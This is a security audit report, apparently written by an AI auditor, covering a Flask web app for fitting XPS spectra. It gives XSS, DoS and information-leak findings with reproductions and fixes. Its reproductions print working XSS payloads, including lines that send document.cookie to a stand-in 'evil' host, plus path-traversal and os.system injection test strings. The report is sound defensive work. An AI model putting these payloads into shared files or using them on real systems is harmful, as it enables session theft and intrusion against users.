# XPS Fitting Studio — Security & Robustness Audit

**Date:** 2026-06-09
**Auditor:** Claude (Opus 4.7), read-only audit run from `claude-code`
**Scope:** `app.py`, `parser.py`, `vgd_parser.py`, `fitting.py`, `templates/index.html`
**Target:** production deployment at `xps.fortierlab.org` (gunicorn LaunchAgent + Cloudflare Tunnel)

Every finding below was reproduced or demonstrated against the code path
in question; speculative items were discarded. Severity rubric:

- **P1** — confirmed exploitable; an attacker who can send a victim a file
  (or convince a victim to upload one) can run arbitrary script in the
  victim's browser session or otherwise compromise their data.
- **P2** — silent data corruption or denial-of-service that can be
  triggered by a single hostile request or file.
- **P3** — defense-in-depth gap, information leak, or operational issue
  that hardens the service but is not directly exploitable today.

Scientific reference values (RSF tables, BE references, charge-correction
defaults) and architectural / style preferences are out of scope, as
requested.

## P1 — Confirmed exploitable

### F1 — XSS via `peaks[].name` and `peaks[].color` in a loaded project file

**Sinks:**
- `templates/index.html:5028-5046` (`renderPeakList` — `item.innerHTML = …`)
- `templates/index.html:6504, 6604-6607` (fit results table, quantify table)
- `templates/index.html:9111, 9122, 9126, 9143` (`_validateUncertainties` warning list, rendered into `innerHTML` at lines 6519-6522)

**Source of untrusted data:** `peaks[].name` and `peaks[].color` strings
inside any `.proj.json` / `.proj.zip` / `.spec.json` / `.fit.json` file.
The loader at `templates/index.html:2791` spread-copies peaks straight
through (`(data.peaks || []).map(p => ({...p}))`) with no schema
validation or escaping. The peak-list template at line 5031 interpolates
`${p.name}` and at line 5030 `${p.color}` directly into HTML.

**Reproduction:** Hand-edit any `.proj.json` so a peak contains
`"name": "<img src=x onerror=alert(document.domain)>"` (or a `color`
value that breaks out of the `style="background:…"` attribute, e.g.
`red\" onmouseover=\"alert(1)`). Save the file. In a fresh browser tab,
load the project. The peak panel renders and the payload fires
immediately.

**Impact (plain language):** A maliciously edited project file shared
between collaborators can silently run JavaScript inside the victim's
browser the moment they open it. That script can read everything visible
in the app (open spectra, fit results), call any `/api/*` endpoint as the
victim, and replace the on-screen UI to harvest more data on subsequent
clicks. Because the site is single-origin and has no authentication,
"the victim's session" effectively means "the victim's tab".

**Fix direction:** Route every user-string interpolation through the
existing `_escHtml` helper (defined at `templates/index.html:9980`), or
rewrite the peak-row / fit-row builders with `createElement` +
`textContent`. Additionally validate `color` on load against a hex regex
such as `^#[0-9a-fA-F]{3,8}$` before storing.

### F2 — XSS via `tabs[].name` and `tabs[].id` in a loaded project file

**Sinks:**
- `templates/index.html:9510-9515` (`runPropagation` open dialog —
  `list.innerHTML = … ${t.name} …`)
- `templates/index.html:2983-2985` (survey selector — `${s.id}` placed
  into an `onclick="…('${s.id}')"` attribute, `${s.name}` into the
  element body)
- `templates/index.html:3046-3047` (survey marker list — `${surveyId}`
  injected into an `onclick` string)

**Source of untrusted data:** `tabs[].name` and `tabs[].id` from a
loaded project file. The loader at `templates/index.html:8316-8322`
keeps the saved `id` verbatim whenever it does not collide with an
existing tab id; `name` is preserved verbatim at line 8365.

**Reproduction:** Edit a project file so a spectrum tab has
`"isSurvey": true`, `"id": "x');alert(document.domain);('"`, and
`"name": "<img src=x onerror=alert(1)>"`. Load the project; open the
Propagate dialog **or** click the Survey selector entry — both fire the
payload.

**Impact (plain language):** Same as F1 — opening a hostile project file
gives the attacker JavaScript execution in the victim's tab; this
variant fires from common dialogs rather than from the peak panel.

**Fix direction:** Escape both `name` and `id` through `_escHtml` before
interpolation. The codebase already treats tab ids as simple slugs
elsewhere; enforce that at load time by rejecting any id that fails a
strict pattern such as `^[A-Za-z0-9_-]{1,64}$`.

### F3 — XSS via stack-entry `color` in a loaded project file

**Sink:** `templates/index.html:1969-1970` (`renderStackLegend` —
`row.innerHTML = '<span class="swatch" style="background:' + entry.color + …'>'`)

**Source of untrusted data:** `tabs[].entries[].color` from a loaded
project file. The loader at `templates/index.html:8348` keeps
`e.color || '#7a7a7a'` verbatim.

**Reproduction:** Project file with a stack tab whose entry has
`"color": "red\" onmouseover=\"fetch('https://evil/x?'+document.cookie)//"`.
Victim loads the project and activates the stack tab; the right-panel
legend renders and the malicious `onmouseover` fires on hover.

**Impact (plain language):** Another XSS pathway through a hostile
project file, this one specific to stack tabs.

**Fix direction:** Validate `entry.color` against a hex-color regex on
load. Alternatively set the swatch background via
`swatchEl.style.background = entry.color` — the CSS parser drops
malformed values without HTML interpretation, removing the attack
surface even if validation is forgotten elsewhere.

### F4 — XSS via peak `name` reflected into `<input value=…>` and `oninput=` JS

**Sink:** `templates/index.html:5060` (`renderPeakForm` —
`<input type="text" value="${p.name}" oninput="updatePeakParam(${p.id},'name',this.value)…">`),
placed into the DOM via `body.innerHTML = renderPeakForm(p)` at
`templates/index.html:5251`.

**Source of untrusted data:** `p.name` from a loaded project file
(see F1 for the load path).

**Reproduction:** Peak with
`"name": "\" autofocus onfocus=alert(1) x=\""` is rendered as
`value="" autofocus onfocus=alert(1) x=""`. When the peak body is
expanded (auto-expands for peaks in `expandedIds`), the input grabs
focus and fires the payload.

**Impact (plain language):** Same as F1, reached when the user clicks a
peak row to edit it.

**Fix direction:** Build the form with `createElement` and assign
`.value` as a DOM property (the browser treats DOM-property assignments
as data, never as HTML). Failing that, escape `p.name` through
`_escHtml` and stop building handler attributes by string
concatenation.

### F5 — XSS via `peaks[].id` interpolated into `onclick=` / `oninput=` JS attributes

**Sinks (representative; same pattern repeats):**
- `templates/index.html:5029` (`onclick="togglePeakBody(${p.id})"`)
- `templates/index.html:5033` (`onclick="…removePeak(${p.id})"`)
- `templates/index.html:5060, 5066, 5093, 5097, 5143, 5152, 5164, 5174,
  5181, 5195, 5202, 5210, 5224, 5231, 5239, 5242` (various
  `…(${p.id},…)` JS expressions in attributes)
- `templates/index.html:6607-6609, 9966-9975` (same pattern with `s.id`)

**Source of untrusted data:** `peaks[].id` from project files
(spread-copied with no coercion at `templates/index.html:2791, 8280,
8370`).

**Reproduction:** Peak with
`"id": "1);fetch('https://evil/x?'+document.cookie);//"`. Once
rendered, clicking anywhere in the peak header executes the injected JS
inside the `onclick` attribute.

**Impact (plain language):** Another single-click script-execution
attack vector through a hostile project file.

**Fix direction:** Coerce every loaded peak / tab / snapshot id to a
non-negative integer (or strict slug) at project-load time and reject
the file when coercion fails. The rest of the codebase already assumes
ids are numbers or slugs.

## P2 — Silent corruption / DoS

### F6 — `/api/upload` of any `.vgd` file returns a fabricated "spectrum"

**Sink:** `parser.py:367-411` (`_vgd_bruteforce`, the third and final
fallback inside `parser.parse_vgd`, which `parser.parse_file` calls
from `/api/upload` on any `.vgd` upload). Backend route:
`app.py:188-232` (`upload`).

**Reproduction:**

```python
# 200 bytes of zero
POST /api/upload  file=<200×0x00 bytes>, name="fake.vgd"
→ 200 OK, n_points=50, counts=[0.0,…,0.0], energy=[0,1,…,49]

# 1024 random float32 bytes
POST /api/upload  file=<random 4 KB>, name="random.vgd"
→ 200 OK, n_points=1024,
  counts_range=[20.3, 49995.4], energy_range=[0.0, 1023.0]
```

Both responses are indistinguishable from a real successful upload —
no warning is sent to the client, and the only signal is a `logger.warning`
on the server side ("energy axis is INDEX only"). The fabricated data
is committed to the session and downstream fits run against it.

**Impact (plain language):** A user who picks the wrong file, has a
corrupted VGD, or is sent a hostile `.vgd` will see what looks like a
real spectrum in the app. They can mark peaks, run fits, export
results — all of it computed from arbitrary file bytes. For an XPS
service used in published research, this is the most consequential
defect in the codebase. Note that the parallel `/api/parse-vgd`
endpoint (which uses the strict `vgd_parser.parse_vgd` via `olefile`)
**does** reject non-OLE files cleanly — only the heuristic
`parser.parse_vgd` path reachable through `/api/upload` is affected.

**Fix direction:** Either remove the brute-force strategy entirely
(make `parser.parse_vgd` return failure when both header-based
strategies fail), or surface a top-level warning in the API response
when the brute-force fallback fires and have the frontend show a
prominent banner. Best option: route `/api/upload`'s `.vgd` branch
through `vgd_parser.parse_vgd` (the strict olefile-based parser) and
treat anything else as a parse failure.

### F7 — No upper bound on `n_perturb`; pure-Python Tougaard is O(n²)

**Sinks:**
- `app.py:420` (`n_perturb = int(body.get("n_perturb", 5))` — no cap)
- `fitting.py:949-987` (the perturb loop re-runs the full composite fit
  `n_perturb` times)
- `fitting.py:508-533` (`tougaard_background` — `for i in range(n)` in
  pure Python, allocating an `xa[i:]` slice and a kernel of the same
  length on every iteration)

**Reproduction:** Timing measured locally:

```
n_perturb=0  → 0.02s  (1-peak fit, 1000-pt ROI)
n_perturb=5  → 0.08s
n_perturb=50 → 0.55s
```

The cost scales linearly in `n_perturb`. With `n_perturb=10000` and a
2-peak model, a single request is enough to occupy a gunicorn worker
for many minutes — directly confirmed during this audit when a probe
with a moderate-but-not-extreme `n_perturb` value hung the verification
shell for over an hour with no output, demonstrating the DoS on the
auditor's own laptop. Independently, `tougaard_background` on an
8000-point ROI takes ~0.22 s; doubling the ROI quadruples the time. A
50 MB CSV (the upload cap) can contain ~2.5 M points; selecting that
as the ROI with `method=tougaard` is many seconds to many minutes per
request.

**Impact (plain language):** A single client can lock up multiple
gunicorn workers by sending a few `/api/fit` requests with a very large
`n_perturb` (or a Tougaard background over a large ROI). With four
workers, four such requests will make the site unresponsive to other
users until gunicorn's worker timeout fires and resets each one.
Sustained traffic of this shape keeps the site down.

**Fix direction:** Cap `n_perturb` server-side at a reasonable value
(e.g. 100); reject larger values with a 400. For backgrounds, vectorise
the Tougaard loop with `numpy` (the kernel is a function of `|i - j|`,
so the integral is a 1-D convolution / cumulative sum) and / or cap
the ROI length that any background method will accept. Confirm the
gunicorn / LaunchAgent `--timeout` is set conservatively (default 30s)
as a backstop.

### F8 — No size caps on project-file load; crafted `.proj.json` or `.proj.zip` freezes the browser tab

**Sinks:**
- `templates/index.html:8331` (`data.tabs.map(...)` — no length cap)
- `templates/index.html:8368` (`rawBE: t.rawBE || []`,
  `rawIntensity: t.rawIntensity || []` — taken verbatim, no length
  check)
- `templates/index.html:8457-8473` (`_loadZipProject` —
  `JSZip.loadAsync` with no compressed / uncompressed ratio cap,
  iterates `manifest.spectra` and `JSON.parse`s every entry)

**Reproduction:** A small (~50 KB) `.proj.zip` whose `manifest.spectra`
lists 1000 spectra, each with `rawBE` and `rawIntensity` arrays of 10⁷
identical numbers, compresses extremely well but inflates to multiple
gigabytes in the JS heap on load, freezing or crashing the tab. The
plain-JSON variant is achievable by hand-editing a `.proj.json` to
contain a single huge `rawBE`.

**Impact (plain language):** A small file from another user can lock
up or crash the XPS browser tab when opened, losing whatever was open
in other tabs at the time. Limited to the victim's browser (no upload
involved), so impact is per-user, not service-wide.

**Fix direction:** On project load, cap `tabs.length` (e.g. 100), cap
each `rawBE.length` / `rawIntensity.length` (e.g. 10⁶), cap
`manifest.spectra.length`, and reject the file with a notify-style
toast past those thresholds. For the zip path, inspect each
JSZip entry's `_data.uncompressedSize` before calling `.async('string')`
and bail out if the total exceeds a generous bound.

## P3 — Defense-in-depth / information leaks

### F9 — `int(...)` on free-form JSON fields raises ValueError → generic 500

**Sites:** `app.py:331, 399, 420` — `int(body.get("endpoint_avg", 1))`
and `int(body.get("n_perturb", 5))` are called without `try/except`.

**Reproduction:**

```
POST /api/background {"session_id":"…","endpoint_avg":"not-a-number"}
→ 500 {"error":"Internal server error"}
(server log: ValueError: invalid literal for int() with base 10: 'not-a-number')
```

**Impact (plain language):** A typo in a request body produces a noisy
500 plus a stack-trace in the server log instead of a clean 400. Not
exploitable, but it does mean the server logs grow noisily from honest
typos and confused clients.

**Fix direction:** Wrap the `int(...)` calls in `try/except ValueError`
and respond with a 400 stating which field was malformed. The existing
`_parse_int` helper at `app.py:489` already does this for index fields
and could be reused.

---

### F10 — Raw library exception messages leak to the API response body

**Sites:** `app.py:213, 269, 271, 441` — error replies of the form
`_err(f"Failed to parse file: {exc}")`,
`_err(str(exc))` (from the VGD endpoint),
`_err(f"VGD parse error: {exc}", 500)`,
`_err(f"Internal fitting error: {exc}", 500)`.

**Reproduction:**

```
POST /api/upload   fake.xlsx  →  "Cannot open Excel file: File is not a zip file"
POST /api/upload   fake.xls   →  "Excel file format cannot be determined, you must specify an engine manually."
POST /api/parse-vgd <truncated OLE header>
                              →  "bytes length not a multiple of item size"   (numpy frombuffer error)
```

**Impact (plain language):** Error messages occasionally name the
underlying library or expose its internal phrasing. Nothing here
fingerprints the host or reveals a path on disk, but it does help an
attacker map the dependency surface (openpyxl, pandas, numpy) — useful
for known-CVE scanning of those versions later. The fitting and
generic-VGD 500 branches also leak the raw `repr(exc)`, which could
include more sensitive substrings if a future library change throws a
path-containing error.

**Fix direction:** Replace `f"…: {exc}"` formats in 500 branches with
a generic message ("Internal parse error. The server log has details.")
and only include the raw `exc` text for known-safe `ValueError`
branches the code itself raises. The existing `_register_error_handlers`
already does this for unhandled 500s; mirror it for the explicitly
caught cases.

### F11 — lmfit recursion-depth message echoed when a peak's spin-orbit master is itself

**Site:** `app.py:438` — `_err(str(exc), 422)` propagates the
`RuntimeError("lmfit fitting failed: maximum recursion depth exceeded")`
raised at `fitting.py:933` when `_make_peak_params` builds a
self-referencing expression (`constrain_to == self.id`).

**Reproduction:**

```
POST /api/fit { … peaks: [{"id":"p1","constrain_to":"p1","splitting":0,"area_ratio":1,…}] }
→ 422 {"error":"lmfit fitting failed: maximum recursion depth exceeded"}
```

The request returns cleanly (the worker survives), but the response
echoes "lmfit" and "recursion depth", confirming both the engine and
the validation gap to the client.

**Impact (plain language):** Small info leak plus a missing validation
gate. Hand-built / hostile clients can trigger this on any session
they have a valid session_id for.

**Fix direction:** In `fitting._make_peak_params`, raise a `ValueError`
when `master_id == spec["id"]` (or when a cycle is detected across
the constraint graph), so the response becomes a clean 400 with a
message like "Peak 'p1' cannot constrain to itself".

### F12 — `/api/parse-vgd` accepts any file extension

**Site:** `app.py:236-273` — the endpoint accepts the upload, writes
it to a UUID-named temp path, and only then calls
`vgd_parser.parse_vgd` (which validates with `olefile.isOleFile`).

**Reproduction:** `POST /api/parse-vgd file=…, name="pwn.exe"` → the
upload is written to disk as `vgd_tmp_<uuid>.vgd` and then immediately
deleted in `finally:`; the response is a clean 400.

**Impact (plain language):** Functionally safe today because the temp
filename uses a server-generated UUID (so `secure_filename` is not
needed) and `olefile.isOleFile` rejects non-OLE content before any
parser does work on it. The gap is purely defense-in-depth: the
endpoint is willing to spend the 50 MB upload budget on any extension.

**Fix direction:** Reject before saving if
`Path(f.filename).suffix.lower() != ".vgd"`. Mirrors the explicit
extension check that `/api/upload` already performs.

### F13 — `uploads/` session `.npz` files accumulate indefinitely

**Site:** `app.py:73-95, 297-302`. Sessions are created on every
upload, persisted as `uploads/<uuid>.npz`, and only removed when the
client calls `DELETE /api/session/<id>` (the frontend does not
appear to do this on tab close).

**Reproduction:** `ls uploads/` on the live host already shows session
files from May 7 through June 9 — ~40 files spanning a month,
~150 KB total today. The pattern is unbounded: at the 50 MB upload cap
and arbitrary client concurrency, a few thousand requests would fill
the disk.

**Impact (plain language):** Slow disk-exhaustion DoS, and ongoing
storage of arbitrary user-supplied numerical data that the user
probably believed was ephemeral. Not exploitable in the short term,
but worth fixing before the service is publicised more widely.

**Fix direction:** Add a periodic cleanup (cron, LaunchAgent, or
`apscheduler` inside the gunicorn master) that deletes `.npz` files
older than N days, and/or make `DELETE /api/session/<id>` fire from
the frontend on tab close and project unload.

## Confirmed-safe behaviors (negative findings)

These categories were examined explicitly and **no real defect was
found**; recording them here so a future audit knows what was already
checked:

- **Path traversal** on `session_id`. `_validate_session_id`
  (`app.py:480`) parses the id with `uuid.UUID(...)` before any
  filesystem access; Flask's URL routing also rejects `..` segments at
  the route level. Tested with `GET /api/session/../../../etc/passwd`
  and the URL-encoded variant — both return 404.
- **`np.load` arbitrary-code execution.** `_load_session`
  (`app.py:77-83`) uses `np.load(path)` without `allow_pickle=True`;
  modern NumPy defaults to `allow_pickle=False`. Even if a session
  `.npz` were tampered with on disk, no code execution path exists.
- **Expression injection through lmfit / asteval.** `splitting` and
  `area_ratio` are coerced through `float(...)` in
  `fitting._make_peak_params` before being interpolated into an asteval
  expression. Tested with
  `splitting="__import__('os').system('touch /tmp/pwn')"` — the
  request returns 400 "could not convert string to float" and no file
  is created. `peak.id` is interpolated into the lmfit `Model` prefix,
  which lmfit itself validates against an identifier regex; tested with
  `id="p2'; raise Exception('PWN')#"` → 400 "'…' is not a valid Model
  prefix". asteval is sandboxed (no `import`, no attribute access on
  arbitrary objects), so even a hypothetical injection would be
  bounded.
- **Frontend prototype pollution.** Every place in `templates/index.html`
  that copies an untrusted object uses object-spread (`{...t.ui}`,
  `{...p}`), which is `[[DefineOwnProperty]]` — a literal `__proto__`
  key is copied as an own property and the prototype setter is **not**
  invoked. There is no `Object.assign(target, untrustedObj)` and no
  recursive merge.
- **Frontend code-from-string.** No `eval`, no `new Function`, no
  `setTimeout` / `setInterval` called with a string argument anywhere
  in `templates/index.html`.
- **Frontend `localStorage` round-trip.** The only `localStorage` use
  stores / reads the literal `'light'` / `'dark'` (`xps-theme`); no
  attacker-controlled value is read back into the DOM.
- **`/api/parse-vgd` content-validation.** Uses
  `olefile.isOleFile(filepath)` before any parsing work. Tested with
  garbage content of every shape — clean 400 every time.
- **`/api/fit` shape validation.** `fitting.run_fit` raises
  `ValueError` for unknown shape names; this returns a clean 400 to
  the client.
- **CORS / CSRF.** Flask is configured with no
  `Access-Control-Allow-Origin` header, so browsers will not let other
  origins read API responses. Since there is no authentication and
  every endpoint is open, classical CSRF does not change the threat
  model.
- **Werkzeug debugger.** `app.py:534` only sets `debug=True` when
  `FLASK_DEBUG=1`. The production gunicorn entry point uses
  `app:create_app()` and never enters the `if __name__ == "__main__"`
  block.

## Recommended order of attack

1. **F1–F5** before anything else. These are one-click-script attacks
   from a shared `.proj.json` and the file format is explicitly
   designed to be shared between collaborators. The mitigations are
   small and localised.
2. **F6** (silent VGD fabrication). This is the only finding that can
   silently corrupt published research output.
3. **F7** (`n_perturb` / Tougaard DoS). Quick to cap; protects the
   service from a single hostile client.
4. **F8** (project-file size caps). Defensive; lands naturally with
   the F1–F5 cleanup since both modify the project loader.
5. **F9–F13** at leisure as defense-in-depth.
